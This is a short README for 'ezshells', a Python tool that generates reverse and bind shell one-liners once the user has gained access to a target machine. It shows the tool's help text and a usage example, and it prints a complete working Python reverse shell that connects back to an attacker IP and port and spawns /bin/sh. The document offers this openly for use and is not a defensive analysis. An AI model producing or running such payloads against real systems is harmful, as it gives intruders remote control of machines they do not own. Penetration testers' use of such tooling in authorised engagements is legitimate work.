# ezshells

## What is ezshells

ezshells is just a quick Python tool I wrote, because I'm a lazy bugger. I wanted a way to quickly generate my reverse shells when I gain access to a box.


## Usage example

It's still pretty simple, but here is the help message and a usage example:

```
python3 ezshell.py -h
usage: ezshell.py [-h] -i ATTACKERIP -p PORT -l LANGUAGE [-s SHELLTYPE]

Easy copy-pasta my shells.

optional arguments:
  -h, --help            show this help message and exit
  -i ATTACKERIP, --localIP ATTACKERIP
                        Your box's IP.
  -p PORT, --port PORT  Port to connect to.
  -l LANGUAGE, --language LANGUAGE
                        Language to create shell.
  -s SHELLTYPE, --shelltype SHELLTYPE
                        Reverse or Bind shell.

```


Let's say the machine you're on has Python installed. You want to set up a Python reverse shell on your machine at 10.0.14.32 and have a listener set up on 3333. You'd run the following:

```
python3 ezshell.py -i 10.0.14.32 -p 3333 -l python
```

You will get the following output:

```
[+] Python Reverse shell:
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.14.32",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

In order to further simplify it, I added a functionality that automatically attaches it to your clipboard. This minimizes the need to highlight and copy/paste. Less room for error, too. That said, you will need to install pyperclip to ensure it works.
